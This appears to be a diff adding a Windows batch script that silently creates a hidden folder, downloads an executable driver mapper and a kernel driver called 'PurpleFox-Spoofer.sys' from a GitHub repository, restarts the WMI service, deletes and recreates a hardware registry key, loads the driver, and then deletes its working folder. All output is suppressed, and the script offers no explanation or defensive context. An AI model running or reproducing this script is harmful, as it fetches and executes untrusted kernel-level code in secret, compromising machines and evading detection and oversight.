@@ -1,0 +1,12 @@
+MKDIR "C:\Users\Administrator\Contacts\5P00FY" >NUL 2>&1
+CD /D "C:\Users\Administrator\Contacts\5P00FY" >NUL 2>&1
+curl -s -g -L -o "DriverMapper.exe" "https://github.com/agr3fox-x64/i9kuk378yj6g-PurpleFoxSpoofy/raw/main/DriverMapper.exe$"  >NUL 2>&1
+curl -s -g -L -o "PurpleFox-Spoofer.sys" "https://github.com/agr3fox-x64/i9kuk378yj6g-PurpleFoxSpoofy/raw/main/PurpleFox-Spoofer.sys$"  >NUL 2>&1
+SET "KernleMapper=DriverMapper.exe" >nul 2>&1
+SET "Driver=PurpleFox-Spoofer.sys" >nul 2>&1
+sc stop winmgmt >nul 2>&1 & sc start winmgmt >nul 2>&1
+REG DELETE "HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System" /F >nul 2>&1
+CALL %KernleMapper% %Driver% >nul 2>&1
+REG ADD "HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System" /F
+sc stop winmgmt >nul 2>&1 & sc start winmgmt >nul 2>&1
+CD /D "C:\" >nul 2>&1 & RMDIR /S /Q "C:\Users\Administrator\Contacts\5P00FY" >nul 2>&1
